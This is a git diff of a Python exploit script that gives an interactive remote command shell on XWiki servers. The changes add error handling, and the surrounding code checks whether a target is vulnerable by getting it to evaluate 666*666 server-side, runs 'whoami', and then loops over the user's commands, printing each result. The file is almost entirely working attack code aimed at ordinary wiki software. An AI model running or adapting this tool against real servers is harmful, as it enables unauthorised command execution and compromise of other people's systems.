@@ -29,6 +29,7 @@ def make_url(host, encoded_command):
   return f"{host}{xwiki}{encoded_command}"
 
 def replace_entities(raw):
+  if raw is None: return None
   return raw.replace('&nbsp;', ' ').replace('&lt;', '<').replace('&gt', '>')
 
 def find_output(txt:str, marker_before, marker_after):
@@ -38,20 +39,26 @@ def find_output(txt:str, marker_before, marker_after):
   return cleanhtml(txt[second_from:first_to])
 
 def execute_and_read(host, cmd="whoami"):
-  command = encode_command(cmd)
-  r = requests.get(make_url(host, command), verify=False)
-  if r.status_code == 200 or r.status_code == 401:
-    txt = r.text
-    return find_output(txt, BEFORE, AFTER)
-  else:
-    return None
+  try:
+    command = encode_command(cmd)
+    r = requests.get(make_url(host, command), verify=False)
+    if r.status_code == 200 or r.status_code == 401:
+      txt = r.text
+      return find_output(txt, BEFORE, AFTER)
+  except: 
+    error(f"{fore.RED}That went wrong, please check your connection{style.RESET}")
+  return None
 
 def test(host) -> bool:
-  url = make_url(host, encode('println(666*666);'))
-  r = requests.get(url, verify=False)
-  if r.status_code == 200 or r.status_code == 401:
-    txt = r.text
-    return f"{666*666}" in txt
+  try:
+    url = make_url(host, encode('println(666*666);'))
+    r = requests.get(url, verify=False)
+    if r.status_code == 200 or r.status_code == 401:
+      txt = r.text
+      return f"{666*666}" in txt
+  except:
+    error(f"{fore.RED}Unable to test host, maybe no route to it?{style.RESET}")
+    sys.exit(1)
   return False
 
 def banner():
@@ -98,6 +105,11 @@ else:
   sys.exit(0)
 
 user = execute_and_read(host, 'whoami')
+
+if user is None:
+  error(f"Sorry, unable to execute {fore.LIGHT_BLUE}whoami{style.RESET}, bailing")
+  sys.exit(0)
+
 # Fancyness is not optional, right?
 success(f"You are now {style.BOLD}{style.BLINK}{fore.LIGHT_BLUE}{user}{style.RESET} on {style.BOLD}{fore.LIGHT_BLUE}{host}{style.RESET}, have fun :)\n")
 
@@ -107,7 +119,10 @@ while(True):
     break
   try:
     result = replace_entities(execute_and_read(host, cmd))
-    print(result)
+    if result is None:
+      error(f"{fore.RED}Whoops, that failed horribly{style.RESET}")
+    else:
+      print(result)
   except:
     warn(f"Command failed: {fore.RED}{cmd}{style.RESET}")
 
